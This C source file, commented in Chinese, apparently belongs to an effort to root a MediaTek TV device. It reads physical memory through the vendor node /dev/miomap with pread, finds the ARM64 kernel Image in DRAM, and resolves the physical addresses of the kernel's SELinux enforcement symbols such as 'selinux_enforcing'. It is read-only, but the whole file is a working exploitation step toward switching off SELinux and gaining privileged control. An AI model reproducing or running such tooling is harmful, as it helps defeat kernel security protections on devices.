/*
 * miopread.c —— /dev/miomap 的纯 pread 只读物理内存探测（风险最低档）。
 *
 * 背景 (docs/17): mmap /dev/miomap -> 2次复现 kernel_panic 打挂设备。
 *   但 pread(fd, buf, n, phys) 由内核态 copy_to_user 完成，
 *   天然绕开用户态 mmap 的 ARM64 内存属性冲突 => 可能是唯一安全通道, 尚待验证。
 *
 * 本程序【只做 pread 只读】，绝不 mmap、绝不 pwrite、绝不 ioctl。
 *
 * 流程(每步先落盘再下一步):
 *   [A] open (/dev/miomap, O_RDONLY 优先, 退 O_RDWR)
 *   [B] pread 读 cmdline 确认存在的真实 DRAM 页 (recovery_fbaddr/VOC_MEM/CMA0)
 *       => 验证 pread 通道是否可用（可达性 oracle）
 *   [C] 若通道可用：在候选基址做【小步长(4KB), 窄窗口】扫 ARM64 Image 头 magic "ARMd"
 *       (绝不 64KB×整DRAM 大扫；只扫低 16MB DRAM 内, 因 Image 通常 mmap 在最前)
 *   [D] 若命中 Image: 尝试用 pread 逐字扫描 __ksymtab_strings 区域做 PREL32 反查
 *       "selinux_enforcing" 符号的物理地址（纯只读, 与 miroot2 不同处全用 pread 取代 mmap）
 *
 * 每步都把结论 fsync 到 /sdcard/miopread.log 与 factory 目录, 双备份。
 * 原则: 若一步操作后设备失联(panic), 重启后读日志即知死在何步。
 * 这是"只读物理内存"风险最低的一档, 存在不可预期 panic 的概率仍>0,
 * 但 docs/17 已证: 只有 mmap 是必死, read/pread 均未触发。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <inttypes.h>
#include <errno.h>
#include <sys/stat.h>

#define LOG_SD  "/sdcard/miopread.log"
#define LOG_DAT "/data/data/com.mediatek.tv.factory/miopread.log"
#define IMAGE_MAGIC 0x644d5241u   /* "ARMd" */
#define PAGE_SZ 4096

static FILE *g_a, *g_b;
static void step(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    char line[1024]; vsnprintf(line, sizeof(line), fmt, ap); va_end(ap);
    printf("%s\n", line);
    if (g_a) { fprintf(g_a, "%s\n", line); fflush(g_a); fsync(fileno(g_a)); }
    if (g_b) { fprintf(g_b, "%s\n", line); fflush(g_b); fsync(fileno(g_b)); }
    sync();
}

/* 用 pread 读 phys 起始 n 字节到 buf (n<=PAGE_SZ_stable)。返回实际读到的字节 */
static ssize_t pread_mem(int fd, uint64_t phys, void *buf, size_t n) {
    return pread(fd, buf, n, (off_t)phys);
}

int main(int argc, char **argv) {
    /* 可选 argv[1]: "scan" 允许做 Image 头小扫步; 默认只做 [A][B] 通道验证 */
    /* 可选 argv[2]: "sym"  允许做内核符号反推 (需 scan 命中 Image) */
    int do_scan = argc >= 2 && strcmp(argv[1], "scan") == 0;
    int do_sym  = argc >= 3 && strcmp(argv[2], "sym") == 0;

    remove(LOG_SD);
    g_a = fopen(LOG_SD, "w");
    g_b = fopen(LOG_DAT, "w");
    if (g_a) setvbuf(g_a, NULL, _IONBF, 0);
    if (g_b) setvbuf(g_b, NULL, _IONBF, 0);

    step("[A] miopread start uid=%d scan=%d sym=%d",
         getuid(), do_scan, do_sym);

    /* ---- A: open ---- */
    int fd = open("/dev/miomap", O_RDONLY);
    step("[A ] open O_RDONLY -> fd=%d %s", fd, fd < 0 ? strerror(errno) : "");
    if (fd < 0) {
        fd = open("/dev/miomap", O_RDWR);
        step("[A ] open O_RDWR -> fd=%d %s", fd, fd < 0 ? strerror(errno) : "");
        if (fd < 0) { step("[A ] FATAL: cannot open /dev/miomap"); return 1; }
    }

    unsigned char buf[PAGE_SZ];

    /* ---- B: 通道可达性 oracle —— 读 cmdline 确认的 DRAM 页 ----
       recovery_fbaddr=0x27800000, VOC_MEM=0x29600000, CMA0 st=0x2A400000 */
    const uint64_t oracle[] = { 0x27800000ULL, 0x278f0000ULL, 0x29600000ULL,
                                0x2a400000ULL, 0x0ULL, 0x40000000ULL };
    const char *oname[] = { "recovery_fbaddr", "fb+0xF0000", "VOC_MEM",
                            "CMA0", "zero", "0x40000000" };
    for (unsigned i = 0; i < sizeof(oracle)/sizeof(oracle[0]); i++) {
        memset(buf, 0, sizeof(buf));
        ssize_t n = pread_mem(fd, oracle[i], buf, 64);
        step("[B] pread(0x%09llx=%-14s,64) -> %zd %s",
             (unsigned long long)oracle[i], oname[i], n, n < 0 ? strerror(errno) : "");
        if (n > 0) {
            char hex[256] = {0}; char *h = hex;
            for (int k = 0; k < (n < 16 ? (int)n : 16); k++)
                h += snprintf(h, hex + sizeof(hex) - h, "%02x ", buf[k]);
            step("         hex: %s", hex);
        }
    }

    if (!do_scan) { close(fd); step("[END] 通道验证完成(scan=off)。设备未挂, 可继续 scan"); return 0; }

    /* ---- C: 在低 DRAM 做【受限】Image 头扫描 ----
       只扫起点 [0x00000000, 0x00000000+3MB] 与 [0x40000000, +1MB] 等候选,
       步长 1 page (4KB), 每步只读 0x40 字节 (0x38 起的 4 字节 magic)。
       与曾打挂的 64KB 全DRAM扫不同: 范围极小、步长小、只读 64B/步。  */
    step("[C] 开始 Image 头扫描(小步长、窄窗口)");
    uint64_t img_pa = UINT64_MAX, text_off = 0, img_size = 0;
    const struct { uint64_t base; uint64_t off; } win[] = {
        { 0x00000000ULL, 0x00800000ULL },  /* 低 8MB */
        { 0x02d00000ULL, 0x01000000ULL },  /* LX_MEM 0x23708000 起, 但 Image 常贴物理基 */
        { 0x40000000ULL, 0x01000000ULL },
        { 0x20000000ULL, 0x00400000ULL },
    };
    for (unsigned wv = 0; wv < sizeof(win)/sizeof(win[0]) && img_pa == UINT64_MAX; wv++) {
        uint64_t base = win[wv].base, end = base + win[wv].off;
        step("[C] window base=0x%016llx end=0x%016llx (len=0x%x)", 
             (unsigned long long)base, (unsigned long long)end, (unsigned)win[wv].off);
        for (uint64_t a = base; a + 0x40 <= end; a += 0x1000) {   /* 4KB 步 */
            memset(buf, 0, sizeof(buf));
            ssize_t n = pread_mem(fd, a, buf, 0x40);
            if (n < 0x3c) continue;   /* 读不满就当空洞 */
            uint32_t magic; memcpy(&magic, buf + 0x38, 4);
            if (magic == IMAGE_MAGIC) {
                memcpy(&text_off, buf + 0x08, 8);
                memcpy(&img_size, buf + 0x10, 8);
                img_pa = a;
                step("[C] *** 命中 Image magic: base=0x%016llx text_off=0x%llx img_size=0x%llx",
                     (unsigned long long)a, (unsigned long long)text_off,
                     (unsigned long long)img_size);
                break;
            }
        }
    }
    if (img_pa == UINT64_MAX) {
        close(fd);
        step("[C] 未在窄窗口命中 Image。设备未挂。scan 到此结束(如需扩大范围另行谨慎评估)");
        return 0;
    }
    step("[C] Image 物理基址 = 0x%016llx  text_pa=0x%016llx  img_end=0x%016llx",
         (unsigned long long)img_pa,
         (unsigned long long)(img_pa + text_off),
         (unsigned long long)(img_pa + img_size));

    if (!do_sym) { close(fd);
        step("[END] Image 已定位(scan 命中)。设备未挂。sym=off 停止。" );
        return 0;
    }

    /* ---- D: 用 pread 实现 PREL32 反向查找 selinux 符号 ----
       思想(同 miroot2): 在 Image [img_pa, img_pa+img_size) 内
         1) 逐字节找字符串 "selinux_enforcing\0", "selinux_state\0"
         2) 全窗口搜 满足 (uintptr_t)p + *(int32*)p == str_pa 的 4B 槽位(p 即 name_offset)
         3) 上一 word = value_offset -> sym_pa = (p-4) + *(int32*)(p-4)
       全部用 pread 逐段读窗口实现(只读)。 */
    step("[D] 开始 PREL32 反向符号查找 (bulk 只读版)");
    uint64_t img_end2 = img_pa + img_size;
    size_t img_buflen = (size_t)(img_end2 - img_pa);
    if (img_buflen == 0 || img_buflen > (64u << 20)) img_buflen = (64u << 20);
    unsigned char *img_buf = (unsigned char *)malloc(img_buflen);
    if (!img_buf) { close(fd); step("[D] malloc fail"); return 1; }
    {
        size_t got = 0;
        while (got < img_buflen) {
            size_t want = (img_buflen - got) > (1u << 20) ? (1u << 20) : (img_buflen - got);
            ssize_t n = pread_mem(fd, img_pa + got, img_buf + got, want);
            if (n == 0) break;
            if (n < 0) { step("[D] 读失败 @0x%llx %s", (unsigned long long)(img_pa+got), strerror(errno)); break; }
            got += (size_t)n;
            if ((ssize_t)n < (ssize_t)want) break;
        }
        step("[D] 已读入 Image %zu bytes", got);
        img_buflen = got;
    }

    static const char *tgts[] = { "selinux_enforcing", "selinux_state", "selinux_enable" };
    for (unsigned t = 0; t < sizeof(tgts)/sizeof(tgts[0]); t++) {
        const char *needle = tgts[t];
        size_t sl = strlen(needle);
        uint64_t s_pa = UINT64_MAX;
        size_t lim = (img_buflen > (32u << 20)) ? (32u << 20) : img_buflen;
        if (lim >= sl + 1) {
            for (size_t i = 0; i + sl + 1 <= lim; i++) {
                if (img_buf[i] == needle[0] && memcmp(img_buf + i, needle, sl + 1) == 0) {
                    s_pa = img_pa + (uint64_t)i; break;
                }
            }
        }
        if (s_pa == UINT64_MAX) { step("[D] %s: 字符串未命中", tgts[t]); continue; }
        step("[D] %s: str @ phys 0x%016llx", tgts[t], (unsigned long long)s_pa);

        uint64_t hit = UINT64_MAX;
        for (size_t i = 0; i + 4 <= img_buflen; i += 4) {
            int32_t v; memcpy(&v, img_buf + i, 4);
            if ((uint64_t)(img_pa + (uint64_t)i + (int64_t)v) == s_pa) { hit = i; break; }
        }
        if (hit == UINT64_MAX) { step("[D] %s: PREL32 槽未命中", tgts[t]); continue; }
        size_t idx_prev = hit - 4;
        if (idx_prev + 4 > img_buflen) { step("[D] %s: value_offset 越界", tgts[t]); continue; }
        int32_t val_rel = 0; memcpy(&val_rel, img_buf + idx_prev, 4);
        uint64_t sym_pa = (img_pa + idx_prev) + (uint64_t)(int64_t)val_rel;
        step("[RET] %-26s phys 0x%016llx (value_ofs@0x%llx val_rel=%d)",
             tgts[t], (unsigned long long)sym_pa,
             (unsigned long long)(img_pa + idx_prev), (int)val_rel);
    }
    free(img_buf);

    close(fd);
    step("[END] 全部完成, 设备未挂");
    return 0;
}